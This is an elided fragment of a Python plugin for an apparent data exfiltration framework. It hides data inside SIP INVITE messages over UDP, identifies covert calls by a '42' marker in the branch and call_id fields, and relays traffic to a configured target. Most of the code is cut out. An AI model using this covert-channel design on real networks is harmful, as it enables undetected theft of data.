...
# When use sip, payload length will be longer than 1500B, therefore it will be segmented. This will cause many problems.
...
def listen():
    app_exfiltrate.log_message('info', "[sip-udp] Listening for incoming calls")
    port = config['port']
        ...
        try:
            ...
            if req.method == 'INVITE':
                ...
                if dialog.branch[11:13] == "42" and dialog.call_id[3:5] == "42":
                    ...
                    app_exfiltrate.log_message('info', "[sip-udp] Received {0} bytes from {1}".format(len(payload), addr[0]))
...
def send(data: str):
    ...
    app_exfiltrate.log_message('info', "[sip-udp] Sending {0} bytes to {1}".format(len(data), target))
...
def proxy():
    app_exfiltrate.log_message('info', "[proxy] [sip-udp] Starting SIP proxy")
    target = config['target']
    port = config['port']
    sender = ""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ...
    while True:
        ...
        try:
            if addr[0] == target:
                app_exfiltrate.log_message('info', "[proxy] [sip-udp] Relaying data to {0}".format(target))
                sock.sendto(data, (sender, port))
            else:
                app_exfiltrate.log_message('info', "[proxy] [sip-udp] Relaying data to {0}".format(sender))
...
class Plugin:
    ...
    def __init__(self, app, conf):
        ...
        app_exfiltrate = app
        config = conf
        app.register_plugin('sip_udp', {'send': send, 'listen': listen, 'proxy': proxy})
